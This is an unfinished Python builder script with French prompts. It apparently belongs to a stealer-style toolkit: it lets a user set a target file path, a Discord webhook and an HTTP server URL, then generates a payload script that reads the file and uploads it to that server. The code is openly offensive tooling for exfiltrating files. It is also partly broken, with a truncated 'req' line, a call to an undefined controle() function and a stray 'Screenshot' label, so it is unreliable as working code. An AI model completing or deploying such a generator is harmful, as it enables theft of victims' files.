###A FINIR

import os
from colorama import Fore, Style, init

init(autoreset=True)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def affichage():
    clear()
    print("=== Configuration Tool ===\n\n")
    print(f"""

{Fore.YELLOW}Options :

{Fore.WHITE}1. Chemin du fichier

{Fore.YELLOW}Sortie et envoi:



{Fore.WHITE}2. Envoi par Discord
3. URL serveur HTTP

{Fore.GREEN}
Tapez : set <num> pour configurer
Tapez : show pour afficher la config
Tapez : create pour générer
Tapez : exit pour quitter
{Style.RESET_ALL}
""")

def filegrab():

    choix = {
        "Chemin du fichier": None,
        "Envoi par Discord": None,
        "Serveur HTTP": None
    }

    def chemin_option():
        clear()
        fichier = input("Entrez le chemin complet du fichier : ")

        if os.path.isfile(fichier):
            choix["Chemin du fichier"] = fichier
        else:
            print("Le chemin spécifié n'est pas valide.")
            input("Entrée...")

    def discord_option():
        clear()
        discord = input("Entrez le webhook Discord pour l'envoi (laisser vide pour ne pas envoyer) : ")

        if discord:
            choix["Envoi par Discord"] = discord
        else:
            choix["Envoi par Discord"] = None

    def http_option():
        clear()
        http = input("Entrez l'URL du serveur HTTP : ")

        if http:
            choix["Serveur HTTP"] = http
        else:
            choix["Serveur HTTP"] = None

    def show_config():
        clear()
        print("=== Configuration actuelle ===\n")

        for key, value in choix.items():
            print(f"{key} : {value}")

        input("\nEntrée pour continuer...")

    def create_payload():
        clear()

        print("=== Script Généré ===\n")

        if not choix["Chemin du fichier"] or not choix["Serveur HTTP"]:
            print("Configuration incomplète.")
            input("Entrée...")
            return

        payload = f"""
import requests
import os

file_path = r"{choix['Chemin du fichier']}"
server_url = "{choix['Serveur HTTP']}"

if os.path.isfile(file_path):

    with open(file_path, "rb") as f:
        r = requests.post(server_url, files={{"file": f}})
        print("Upload terminé :", r.status_code)

else:
    req
"""

        payload_path = os.path.join("payload_created", "script.py")

        os.makedirs(os.path.dirname(payload_path), exist_ok=True)

        with open(payload_path, "w", encoding="utf-8") as f:
            f.write(payload)

        print(Fore.GREEN + f"Script créé : {payload_path}")
        input("Entrée...")

    while True:
        cmd = input(Fore.GREEN + ">> " + Style.RESET_ALL)
        if cmd.lower() == "exit":
            break
        if cmd.lower().startswith("set"):
            try:
                option_num = int(cmd.split()[1])
                if option_num in range(1, 11):
                    option_funcs = {
                        1: chemin_option,
                        2: discord_option,
                        3: http_option,
                    }
                    option_funcs[option_num]()
                else:
                    print(Fore.RED + "Numéro d'option invalide." + Style.RESET_ALL)
            except ValueError:
                print(Fore.RED + "Veuillez saisir 'set'" + Style.RESET_ALL)

        if cmd.lower() == "show":
            clear()
            print("\nConfiguration actuelle du module Screenshot :")
            for key, value in choix.items():
                print(f"{key}: {value}")

        if cmd.lower() == "create":
            controle()
            create_payload()
            break


filegrab()